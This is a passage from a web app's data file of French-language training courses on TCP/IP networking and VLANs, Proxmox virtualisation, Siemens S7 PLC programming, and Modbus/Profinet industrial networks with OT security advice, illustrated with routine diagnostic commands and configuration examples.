# Requête Wazuh/KQL — alertes critiques des 24 dernières heures
# level:>= 10 AND timestamp:[now-24h TO now]`,
        },
        tip: "Créez une liste d'IPs/users légitimes dans votre organisation (whitelist). Toute connexion hors whitelist à des heures inhabituelles mérite investigation.",
      },
    ],
  },

  "reseaux-tcp-ip-vlan": {
    slug: "reseaux-tcp-ip-vlan",
    intro: "La maîtrise des réseaux TCP/IP est la compétence socle de tout technicien systèmes et réseaux. Ce cours couvre le modèle OSI, l'adressage IPv4/IPv6, le routage statique et dynamique (OSPF), la segmentation VLAN et la configuration de switches/routeurs Cisco.",
    sections: [
      {
        title: "1. Modèle OSI et TCP/IP",
        content: `Le modèle OSI (Open Systems Interconnection) découpe les communications réseau en 7 couches indépendantes. En pratique, on utilise le modèle TCP/IP (4 couches) qui est l'implémentation réelle d'Internet.\n\n**Couches OSI** :\n7. **Application** : HTTP, FTP, SMTP, DNS\n6. **Présentation** : chiffrement SSL/TLS, encodage\n5. **Session** : ouverture/fermeture de sessions\n4. **Transport** : TCP (fiable) / UDP (rapide) — ports\n3. **Réseau** : IP, routage, ICMP\n2. **Liaison** : Ethernet, MAC, VLAN (802.1Q)\n1. **Physique** : câbles, fibres, ondes radio\n\n**Mémo** : "Appliquer Précisément Sur le Transport Réseau, les Liens Physiques"`,
        code: {
          lang: "bash",
          code: `# Outils de diagnostic réseau par couche

# Couche 3 — Connectivité IP
ping -c 4 8.8.8.8                    # test de joignabilité
traceroute 8.8.8.8                   # chemin jusqu'à destination
ip route show                        # table de routage Linux

# Couche 4 — Services et ports
ss -tlnp                             # ports en écoute (remplace netstat)
nc -zv 192.168.1.1 80 443           # test d'ouverture de ports

# Couche 2 — ARP et MAC
arp -n                               # table ARP (IP ↔ MAC)
ip neighbor show                     # équivalent moderne

# Capture et analyse de paquets
tcpdump -i eth0 -n port 80 -w capture.pcap
wireshark capture.pcap               # analyse graphique`,
        },
      },
      {
        title: "2. Adressage IPv4 et sous-réseaux (VLSM)",
        content: `La notation CIDR (Classless Inter-Domain Routing) exprime le masque en suffixe : 192.168.1.0**/24** signifie 24 bits de réseau, 8 bits d'hôtes = 254 hôtes utilisables.\n\n**Calcul rapide** :\n- /24 → 256 adresses, 254 hôtes\n- /25 → 128 adresses, 126 hôtes\n- /26 → 64 adresses, 62 hôtes\n- /30 → 4 adresses, 2 hôtes (liens point-à-point)\n\n**VLSM** (Variable Length Subnet Masking) : découper un espace d'adressage en sous-réseaux de tailles différentes selon les besoins réels de chaque segment.`,
        code: {
          lang: "bash",
          code: `# Calculer les sous-réseaux avec ipcalc (Linux)
ipcalc 192.168.10.0/24

# Exemple VLSM — Plan d'adressage pour 192.168.0.0/24 :
# Réseau Direction   : 30 hôtes  → /27 (192.168.0.0/27)
# Réseau Production  : 60 hôtes  → /26 (192.168.0.64/26)
# Réseau WiFi Invités: 100 hôtes → /25 (192.168.0.128/25)
# Lien WAN           : 2 hôtes   → /30 (192.168.0.252/30)

# Vérification avec Python
python3 -c "
import ipaddress
net = ipaddress.IPv4Network('192.168.0.0/27')
print(f'Réseau : {net.network_address}')
print(f'Broadcast : {net.broadcast_address}')
print(f'Hôtes disponibles : {net.num_addresses - 2}')
"`,
        },
      },
      {
        title: "3. VLANs et 802.1Q",
        content: `Un VLAN (Virtual LAN) crée une segmentation logique du réseau sur une infrastructure physique partagée. Les VLANs isolent le trafic, améliorent la sécurité et optimisent les performances.\n\n**Types de ports sur un switch** :\n- **Access** : port connecté à un terminal (PC, imprimante). Appartient à un seul VLAN. La trame Ethernet est non taguée.\n- **Trunk** : port entre switches ou vers un routeur. Transporte plusieurs VLANs. Les trames sont taguées 802.1Q (ajout d'un champ VLAN ID de 12 bits).\n\n**Inter-VLAN routing** : les VLANs ne peuvent pas communiquer entre eux par défaut. Il faut un routeur ou un switch de niveau 3 (router-on-a-stick ou SVI).`,
        code: {
          lang: "text",
          code: `! Configuration Cisco IOS — VLANs

! Créer les VLANs
Switch(config)# vlan 10
Switch(config-vlan)# name DIRECTION
Switch(config)# vlan 20
Switch(config-vlan)# name PRODUCTION
Switch(config)# vlan 99
Switch(config-vlan)# name MANAGEMENT

! Port Access (PC connecté)
Switch(config)# interface GigabitEthernet0/1
Switch(config-if)# switchport mode access
Switch(config-if)# switchport access vlan 10

! Port Trunk (vers un autre switch ou routeur)
Switch(config)# interface GigabitEthernet0/24
Switch(config-if)# switchport mode trunk
Switch(config-if)# switchport trunk allowed vlan 10,20,99

! Vérification
Switch# show vlan brief
Switch# show interfaces trunk`,
        },
        tip: "Placez toujours vos ports non utilisés dans un VLAN 'poubelle' (ex: VLAN 999) et désactivez-les. Un port non utilisé en VLAN 1 par défaut est une faille de sécurité.",
      },
    ],
  },

  "virtualisation-proxmox-vmware": {
    slug: "virtualisation-proxmox-vmware",
    intro: "La virtualisation est au cœur des infrastructures modernes. Elle permet d'optimiser les ressources hardware, d'isoler les services et de déployer rapidement de nouveaux environnements. Ce cours couvre Proxmox VE (open-source) et les bases de VMware vSphere, ainsi que la haute disponibilité et la sauvegarde des VMs.",
    sections: [
      {
        title: "1. Concepts de virtualisation",
        content: `La virtualisation permet de faire tourner plusieurs systèmes d'exploitation (guests) sur un seul serveur physique (host) grâce à un **hyperviseur**.\n\n**Hyperviseur de type 1** (bare-metal) : s'installe directement sur le hardware, pas de système hôte intermédiaire. Plus performant. Ex: **Proxmox VE**, VMware ESXi, Hyper-V, Xen.\n\n**Hyperviseur de type 2** (hosted) : s'installe comme une application sur un OS existant. Ex: VirtualBox, VMware Workstation, Parallels.\n\n**Conteneurs LXC/Docker** : virtualisation au niveau OS, partage le noyau du host. Beaucoup plus léger qu'une VM complète mais isolation moindre.`,
        tip: "En production, utilisez TOUJOURS un hyperviseur de type 1. Les hyperviseurs de type 2 sont réservés au lab et au développement.",
      },
      {
        title: "2. Proxmox VE — Installation et configuration",
        content: `**Proxmox VE** est une plateforme de virtualisation open-source basée sur Debian + KVM + LXC. Elle offre une interface web complète, la gestion des clusters, la haute disponibilité et les sauvegardes intégrées.\n\n**Stockages supportés** : local (ext4/ZFS), NFS, Ceph, iSCSI, LVM, GlusterFS.\n\n**Réseau** : Proxmox crée des bridges Linux (vmbr0, vmbr1...) auxquels les VMs se connectent. Vous pouvez configurer du bonding, des VLANs, des bridges séparés par zone de sécurité.`,
        code: {
          lang: "bash",
          code: `# Après installation Proxmox — configuration réseau (/etc/network/interfaces)
auto lo
iface lo inet loopback

auto eno1
iface eno1 inet manual

# Bridge principal (accès management et VMs)
auto vmbr0
iface vmbr0 inet static
    address 192.168.1.5/24
    gateway 192.168.1.1
    dns-nameservers 192.168.1.10
    bridge-ports eno1
    bridge-stp off
    bridge-fd 0

# Bridge isolé pour VMs (aucun accès physique)
auto vmbr1
iface vmbr1 inet manual
    bridge-ports none
    bridge-stp off
    bridge-fd 0`,
        },
      },
      {
        title: "3. Haute disponibilité (HA) avec Proxmox Cluster",
        content: `Un cluster Proxmox permet de regrouper plusieurs nœuds Proxmox pour la haute disponibilité et la migration à chaud des VMs.\n\n**Prérequis HA** :\n- Minimum 3 nœuds (quorum : majorité de nœuds actifs)\n- Stockage partagé (Ceph, NFS, iSCSI) pour que les VMs soient accessibles depuis tous les nœuds\n- Réseau dédié pour la réplication (recommandé : 10 GbE)\n\n**Fonctionnement** : si un nœud tombe, le manager HA redémarre automatiquement les VMs configurées en HA sur les nœuds disponibles en moins de 60 secondes.`,
        code: {
          lang: "bash",
          code: `# Créer un cluster (sur le premier nœud)
pvecm create MON-CLUSTER

# Rejoindre le cluster (sur les autres nœuds)
pvecm add 192.168.1.5  # IP du premier nœud

# Vérifier l'état du cluster
pvecm status
pvecm nodes

# Configurer HA pour une VM (ID 100)
ha-manager add vm:100 --state started --group ha-group-1

# Voir l'état HA
ha-manager status`,
        },
        tip: "Testez votre HA régulièrement ! Simulez la panne d'un nœud (shutdown brutal) en environnement de test pour valider que les VMs redémarrent correctement.",
      },
    ],
  },

  "automates-programmables-siemens": {
    slug: "automates-programmables-siemens",
    intro: "Les automates programmables industriels (API/PLC) sont les ordinateurs de l'industrie. Ils pilotent les machines, les lignes de production et les processus industriels. Ce cours vous forme à la programmation des automates Siemens S7-1200/1500 avec TIA Portal, le logiciel de développement de référence.",
    sections: [
      {
        title: "1. Architecture d'un automate Siemens S7",
        content: `Un automate Siemens S7 se compose de plusieurs modules :\n\n**CPU** : unité centrale avec mémoire programme et données. Le S7-1200 est destiné aux petites/moyennes machines, le S7-1500 aux grandes installations.\n\n**Modules d'entrées/sorties (E/S)** :\n- **Entrées TOR** (Tout Ou Rien) : capteurs, boutons, fins de course\n- **Sorties TOR** : actionneurs, voyants, relais\n- **Entrées/sorties analogiques** : capteurs 4-20mA, 0-10V (température, pression, débit)\n\n**Mémoire** : mémoire programme (Programme Blocks), mémoire données (Data Blocks), mémoire E/S (Process Image).\n\n**Cycle d'exécution** : Lecture entrées → Exécution programme → Écriture sorties → Communications (répété toutes les 1 à 100ms)`,
        tip: "Le temps de cycle est critique en industrie. Un API trop chargé peut avoir des temps de cycle dépassant les tolérances du procédé. Surveillez toujours le %CPU dans TIA Portal > Diagnostics.",
      },
      {
        title: "2. Programmation Ladder (LD)",
        content: `Le **Ladder Diagram** (Schéma à contacts) est le langage PLC le plus utilisé dans l'industrie. Il représente graphiquement les circuits électriques de relais. Chaque rung (barreau) est une équation logique.\n\n**Symboles de base** :\n- **Contact NO** (normalement ouvert) : --|  |-- → passant si le bit est TRUE\n- **Contact NC** (normalement fermé) : --|/|-- → passant si le bit est FALSE  \n- **Bobine** : --( )-- → met le bit à TRUE si la logique est vraie\n- **Bobine SET** : --(S)-- → force à TRUE et maintient\n- **Bobine RESET** : --(R)-- → force à FALSE\n\n**Blocs fonctionnels** : TON (temporisateur à l'enclenchement), TOF (déclenchement), CTU (compteur), MOVE, ADD, COMPARE...`,
        code: {
          lang: "text",
          code: `// Exemple Ladder — Commande démarrage moteur avec protection thermique
// Réseau 1 : Démarrage moteur
// ------[BP_START]----[/THERMIQUE]----[/BP_STOP]----(MOTEUR_MARCHE)
//         ||
//       [MOTEUR_MARCHE]  ← Contact de maintien (auto-alimentation)

// Réseau 2 : Temporisateur de démarrage progressif (3 secondes)
// ------[MOTEUR_MARCHE]----[TON T#3s]----( VITESSE_PLEINE)
//                              ▼
//                           Q: sortie après 3s

// Variables utilisées :
// I0.0 = BP_START (bouton poussoir marche)
// I0.1 = BP_STOP  (bouton poussoir arrêt, NC câblé en NO ici)
// I0.2 = THERMIQUE (contact thermique moteur, NC)
// Q0.0 = MOTEUR_MARCHE (contacteur moteur)
// Q0.1 = VITESSE_PLEINE (variateur de fréquence)`,
        },
      },
      {
        title: "3. Blocs de données (DB) et structuration",
        content: `TIA Portal organise le programme en **blocs** :\n\n**OB (Organization Block)** : blocs d'organisation appelés automatiquement par le système. OB1 = programme principal (cyclique), OB30 = interruption cyclique, OB82 = alarme de diagnostic.\n\n**FB (Function Block)** : fonction avec mémoire persistante (instance DB). Idéal pour les équipements répétitifs (3 pompes identiques = 3 instances d'un même FB).\n\n**FC (Function)** : fonction sans mémoire. Calculs, conversions.\n\n**DB (Data Block)** : zone de données. Global DB (partagé) ou Instance DB (lié à un FB).`,
        code: {
          lang: "text",
          code: `// Exemple SCL — Régulation PID manuelle (FB simplifié)
FUNCTION_BLOCK FB_Regulation
VAR_INPUT
    Consigne     : REAL;   // Valeur désirée
    Mesure       : REAL;   // Valeur mesurée
    Kp           : REAL := 1.5;  // Gain proportionnel
    Ki           : REAL := 0.1;  // Gain intégral
END_VAR

VAR_OUTPUT
    Commande     : REAL;   // Sortie vers actionneur (0.0 à 100.0%)
END_VAR

VAR
    Erreur       : REAL;
    Integrale    : REAL;
END_VAR

BEGIN
    Erreur    := Consigne - Mesure;
    Integrale := Integrale + (Erreur * Ki * 0.1);  // 0.1 = temps cycle 100ms
    Commande  := LIMIT(0.0, (Kp * Erreur) + Integrale, 100.0);
END_FUNCTION_BLOCK`,
        },
      },
    ],
  },

  "reseaux-industriels-modbus": {
    slug: "reseaux-industriels-modbus",
    intro: "Les réseaux industriels (OT — Operational Technology) connectent les automates, capteurs, actionneurs et superviseurs d'une installation industrielle. Contrairement aux réseaux IT, la priorité est la disponibilité et le temps réel. Ce cours couvre Modbus, Profibus, Profinet et la sécurité des réseaux OT.",
    sections: [
      {
        title: "1. Protocole Modbus",
        content: `**Modbus** est le protocole industriel le plus ancien (1979, Modicon) et encore le plus répandu. Sa simplicité et son interopérabilité en font un standard de facto.\n\n**Variantes** :\n- **Modbus RTU** : communication série (RS-232/RS-485), trames binaires compactes. Un maître, jusqu'à 247 esclaves.\n- **Modbus TCP** : encapsulation dans TCP/IP (port 502). Permet l'intégration dans les réseaux Ethernet.\n- **Modbus ASCII** : rare, caractères ASCII, moins efficace.\n\n**Modèle de données** — 4 types de registres :\n- **Coils** (0x) : sorties TOR lecture/écriture\n- **Discrete Inputs** (1x) : entrées TOR lecture seule\n- **Input Registers** (3x) : registres 16 bits lecture seule\n- **Holding Registers** (4x) : registres 16 bits lecture/écriture`,
        code: {
          lang: "python",
          code: `# Lecture Modbus TCP avec Python (bibliothèque pymodbus)
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('192.168.1.100', port=502)
client.connect()

# Lire 10 Holding Registers depuis l'adresse 0 (esclave ID=1)
result = client.read_holding_registers(address=0, count=10, slave=1)

if not result.isError():
    for i, val in enumerate(result.registers):
        print(f"Registre {i}: {val} (hex: {val:#06x})")
else:
    print(f"Erreur Modbus: {result}")

# Écrire dans un registre (commande vers automate)
client.write_register(address=10, value=1500, slave=1)  # consigne = 1500

client.close()`,
        },
        tip: "Modbus n'a aucune authentification ni chiffrement. En environnement industriel, isolez absolument les réseaux OT des réseaux IT avec un firewall industriel (Stormshield, Fortinet OT).",
      },
      {
        title: "2. Profibus et Profinet",
        content: `**PROFIBUS** (Process Field Bus) : bus de terrain sériel très répandu en Europe, notamment dans l'automobile et la chimie. PROFIBUS DP (Decentralized Periphery) est la variante standard pour l'automatisme.\n\n**PROFINET** : successeur Ethernet de Profibus. Tourne sur infrastructure Ethernet standard 100/1000 Mbps mais avec des mécanismes temps-réel :\n- **PROFINET IO RT** (Real-Time) : cycles 4-512ms, suffisant pour la plupart des applications\n- **PROFINET IO IRT** (Isochronous Real-Time) : cycles <1ms, pour les axes servo et robotique\n\n**Avantages PROFINET** : même câblage que le réseau IT, diagnostic avancé, intégration Web, temps de cycle configurable.`,
        code: {
          lang: "text",
          code: `// Configuration PROFINET dans TIA Portal (résumé)

// 1. Réseau projet → Ajouter équipement PROFINET
//    → Importer fichier GSDML du fabricant (capteur, variateur...)

// 2. Assigner l'adresse IP et le nom PROFINET au périphérique
//    Device Name: "capteur-temperature-zone1"
//    IP Address : 192.168.0.101
//    Subnet     : 255.255.255.0
//    Gateway    : 192.168.0.1

// 3. Mapper les modules E/S dans le rack virtuel TIA

// 4. Adresses dans le programme :
//    %IW64  = Valeur analogique entrée (mot d'entrée 64)
//    %QW32  = Consigne vers variateur (mot de sortie 32)

// Diagnostic depuis le programme
// SFB52 "RDREC" → lire un enregistrement de diagnostic
// SFB53 "WRREC" → écrire un paramètre dans l'équipement`,
        },
      },
      {
        title: "3. Sécurité des réseaux OT/ICS",
        content: `Les systèmes industriels (ICS/SCADA) sont des cibles croissantes pour les cyberattaques (Stuxnet, TRITON, Colonial Pipeline). La convergence IT/OT multiplie les vecteurs d'attaque.\n\n**Principes de sécurité OT (ANSSI)** :\n\n1. **Segmentation réseau** : zone IT ↔ DMZ industrielle ↔ zone OT. Firewall industriel entre chaque zone. Jamais de connexion directe IT-OT.\n\n2. **Gestion des accès** : supprimer les comptes par défaut, MFA pour l'accès distant, journalisation de toutes les connexions.\n\n3. **Mises à jour** : processus de patch management adapté à la contrainte de disponibilité industrielle (fenêtres de maintenance planifiées).\n\n4. **Supervision de sécurité** : sondes industrielles passives (Claroty, Nozomi, Dragos) pour détecter les anomalies sans perturber le process.`,
        tip: "Le guide ANSSI 'Maîtriser la SSI pour les systèmes industriels' (disponible sur ssi.gouv.fr) est la référence française. La norme IEC 62443 est le standard international de cybersécurité industrielle.",
      },
    ],
  },
};
